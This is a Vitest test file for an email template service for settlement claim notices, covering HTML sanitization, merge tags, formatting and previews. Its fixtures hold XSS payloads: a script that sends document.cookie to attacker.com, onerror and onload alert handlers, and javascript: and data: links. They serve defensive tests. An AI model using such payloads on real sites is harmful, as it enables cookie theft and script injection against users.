import { describe, it, expect } from 'vitest';
import {
  TemplateService,
  sanitizeEmailHtml,
  resolveMergeTags,
  formatCurrency,
  formatDate
} from '../../src/services/template.service';

describe('Quill WYSIWYG Template & HTML Sanitization Service', () => {
  describe('HTML Sanitization (XSS Prevention)', () => {
    it('strips dangerous XSS vectors: script tags, onerror handlers, and javascript: links', () => {
      const dirtyHtml = `
        <h1>Official Notice</h1>
        <p>Click below to select your payment option:</p>
        <script>window.location="http://attacker.com?cookie="+document.cookie</script>
        <img src="valid.png" onerror="alert(document.domain)" />
        <a href="javascript:alert('XSS')">Claim Now</a>
        <iframe src="http://malicious-site.com"></iframe>
      `;

      const cleanHtml = TemplateService.sanitize(dirtyHtml);

      expect(cleanHtml).not.toContain('<script>');
      expect(cleanHtml).not.toContain('onerror=');
      expect(cleanHtml).not.toContain('javascript:');
      expect(cleanHtml).not.toContain('<iframe');
      expect(cleanHtml).toContain('<h1>Official Notice</h1>');
      expect(cleanHtml).toContain('Claim Now');
    });

    it('preserves authorized rich formatting tags and safe attributes', () => {
      const richHtml = `
        <h2>Settlement Summary</h2>
        <p>Dear <strong>Claimant</strong>,</p>
        <ul class="benefit-list">
          <li>Deadline: <em>November 30, 2026</em></li>
          <li>Distribution Method: Direct Deposit or Check</li>
        </ul>
        <table style="width: 100%; border: 1px solid #ccc;">
          <thead>
            <tr><th>Tier</th><th>Amount</th></tr>
          </thead>
          <tbody>
            <tr><td>Tier 1</td><td>$250.00</td></tr>
          </tbody>
        </table>
      `;

      const cleanHtml = TemplateService.sanitize(richHtml);

      expect(cleanHtml).toContain('<h2>Settlement Summary</h2>');
      expect(cleanHtml).toContain('<strong>Claimant</strong>');
      expect(cleanHtml).toContain('<ul');
      expect(cleanHtml).toContain('<li>Deadline:');
      expect(cleanHtml).toContain('<table');
      expect(cleanHtml).toContain('<td>$250.00</td>');
    });

    it('preserves dynamic merge tags inside href attributes (e.g. href="{{payment_selection_link}}")', () => {
      const templateHtml = `
        <p>Hello {{claimant_first_name}} {{claimant_last_name}},</p>
        <p>You are eligible to receive {{settlement_amount}} in the matter of {{case_name}}.</p>
        <p><a href="{{payment_selection_link}}">Select Your Payment Method</a></p>
        <p>Deadline: {{selection_deadline}}</p>
      `;

      const cleanHtml = TemplateService.sanitize(templateHtml);

      expect(cleanHtml).toContain('{{claimant_first_name}}');
      expect(cleanHtml).toContain('{{claimant_last_name}}');
      expect(cleanHtml).toContain('{{settlement_amount}}');
      expect(cleanHtml).toContain('{{case_name}}');
      expect(cleanHtml).toContain('href="{{payment_selection_link}}"');
      expect(cleanHtml).toContain('{{selection_deadline}}');
    });

    it('neutralizes null-byte (\\0) injection within template strings', () => {
      const nullByteHtml = '<p>Official\0 <script>alert(1)</script>Notification</p>';
      const cleaned = TemplateService.sanitize(nullByteHtml);

      expect(cleaned).not.toContain('\0');
      expect(cleaned).not.toContain('<script>');
      expect(cleaned).toContain('Official Notification');
    });

    it('strips obfuscated SVG event vectors and nested onload handlers', () => {
      const maliciousSvg = '<svg><g onload="alert(\'XSS\')"><rect width="100" height="100" /></g></svg>';
      const sanitized = TemplateService.sanitize(maliciousSvg);

      expect(sanitized).not.toContain('onload=');
      expect(sanitized).not.toContain('alert');
    });

    it('gracefully handles unclosed and mismatched HTML tags without throwing', () => {
      const brokenHtml = '<div><p>Paragraph without closing tag <strong>bold text';
      expect(() => TemplateService.sanitize(brokenHtml)).not.toThrow();
      const sanitized = TemplateService.sanitize(brokenHtml);
      expect(sanitized).toContain('Paragraph without closing tag');
    });

    it('handles deeply nested HTML structures (60+ nested containers) without stack overflow', () => {
      let deepHtml = 'Safe Nested Content';
      for (let i = 0; i < 65; i++) {
        deepHtml = `<div>${deepHtml}</div>`;
      }
      expect(() => TemplateService.sanitize(deepHtml)).not.toThrow();
      const sanitized = TemplateService.sanitize(deepHtml);
      expect(sanitized).toContain('Safe Nested Content');
    });
  });

  describe('Dynamic Merge Tag Engine', () => {
    it('resolves dynamic merge tags into personalized HTML using claimant context values', () => {
      const template =
        '<p>Dear {{claimant_first_name}}, your settlement of {{settlement_amount}} for {{case_name}} is ready: <a href="{{payment_selection_link}}">Claim</a></p>';
      const context = {
        claimant_first_name: 'Jonathan',
        settlement_amount: 450.00,
        case_name: 'In re Apex Privacy Litigation',
        payment_selection_link: 'https://portal.juris-banking.com/claim/abc123token456'
      };

      const resolved = TemplateService.resolve(template, context);

      expect(resolved).toContain('Dear Jonathan');
      expect(resolved).toContain('settlement of $450.00');
      expect(resolved).toContain('for In re Apex Privacy Litigation');
      expect(resolved).toContain('href="https://portal.juris-banking.com/claim/abc123token456"');
      expect(resolved).not.toContain('{{claimant_first_name}}');
      expect(resolved).not.toContain('{{settlement_amount}}');
    });

    it('preserves unrecognized or malformed merge tags without breaking template renderer', () => {
      const rawTemplate = '<p>Hello {{claimant_first_name}}, {{unknown_future_tag}} and {{unclosed_tag</p>';
      const context = { claimant_first_name: 'Robert' };

      const rendered = TemplateService.resolve(rawTemplate, context);

      expect(rendered).toContain('Hello Robert');
      expect(rendered).toContain('{{unknown_future_tag}}');
      expect(rendered).toContain('{{unclosed_tag');
    });

    it('formats currencies and dates cleanly', () => {
      expect(formatCurrency(1234.5)).toBe('$1234.50');
      expect(formatCurrency('$50.00')).toBe('$50.00');
      expect(formatCurrency('99.99')).toBe('$99.99');

      const testDate = new Date('2026-11-30T12:00:00Z');
      const formatted = formatDate(testDate);
      expect(formatted).toContain('2026');
    });
  });

  describe('Live Template Preview Rendering', () => {
    it('renders desktop preview with responsive container styles', () => {
      const template = '<h2>{{case_name}}</h2><p>Payment: {{settlement_amount}}</p>';
      const preview = TemplateService.renderPreview(template, {
        case_name: 'Tech Settlement 2026',
        settlement_amount: '$250.00'
      }, { viewport: 'desktop' });

      expect(preview.viewport).toBe('desktop');
      expect(preview.renderedHtml).toContain('Tech Settlement 2026');
      expect(preview.previewHtml).toContain('max-width: 680px');
    });

    it('renders mobile preview with compact container styles', () => {
      const template = '<h2>{{case_name}}</h2><p>Payment: {{settlement_amount}}</p>';
      const preview = TemplateService.renderPreview(template, {
        case_name: 'Tech Settlement 2026',
        settlement_amount: '$250.00'
      }, { viewport: 'mobile' });

      expect(preview.viewport).toBe('mobile');
      expect(preview.renderedHtml).toContain('Tech Settlement 2026');
      expect(preview.previewHtml).toContain('max-width: 375px');
    });

    it('escapes HTML entities in dynamic merge tags to prevent XSS injection', () => {
      const template = '<p>Hello {{claimant_first_name}} {{claimant_last_name}}</p>';
      const context = {
        claimant_first_name: '<script>alert("XSS")</script>',
        claimant_last_name: 'O\'Connor & "Son" <bold>'
      };

      const resolved = TemplateService.resolve(template, context);

      expect(resolved).not.toContain('<script>');
      expect(resolved).toContain('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(resolved).toContain('O&#39;Connor &amp; &quot;Son&quot; &lt;bold&gt;');
    });

    it('neutralizes unsafe javascript: and data: schemes in payment_selection_link', () => {
      const template = '<a href="{{payment_selection_link}}">Claim</a>';

      const resolvedJs = TemplateService.resolve(template, {
        payment_selection_link: 'javascript:alert(1)'
      });
      expect(resolvedJs).toContain('href="#"');

      const resolvedData = TemplateService.resolve(template, {
        payment_selection_link: 'data:text/html;base64,PHNjcmlwdD4='
      });
      expect(resolvedData).toContain('href="#"');

      const resolvedSafe = TemplateService.resolve(template, {
        payment_selection_link: 'https://portal.juris-banking.com/claim/xyz'
      });
      expect(resolvedSafe).toContain('href="https://portal.juris-banking.com/claim/xyz"');

      const resolvedRelative = TemplateService.resolve(template, {
        payment_selection_link: '/claim/xyz'
      });
      expect(resolvedRelative).toContain('href="/claim/xyz"');
    });

    it('enforces UTC timezone invariant in formatDate across all host environments', () => {
      const date = new Date('2026-12-15T00:00:00.000Z');
      const formatted = formatDate(date);
      expect(formatted).toBe('December 15, 2026');

      const template = 'Deadline: {{selection_deadline}}';
      const resolved = TemplateService.resolve(template, { selection_deadline: date });
      expect(resolved).toBe('Deadline: December 15, 2026');
    });

    it('guarantees renderPreview remains XSS-free even if malicious sample data is provided', () => {
      const template = '<p>Dear {{claimant_first_name}},</p><a href="{{payment_selection_link}}">Claim</a>';
      const maliciousData = {
        claimant_first_name: '<img src="x" onerror="alert(1)">',
        payment_selection_link: 'javascript:alert(document.cookie)'
      };

      const preview = TemplateService.renderPreview(template, maliciousData);

      expect(preview.previewHtml).not.toContain('<img src="x" onerror="alert(1)">');
      expect(preview.previewHtml).not.toContain('javascript:alert(document.cookie)');
      expect(preview.previewHtml).toContain('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;');
      expect(preview.previewHtml).toContain('href="#"');
    });
  });
});
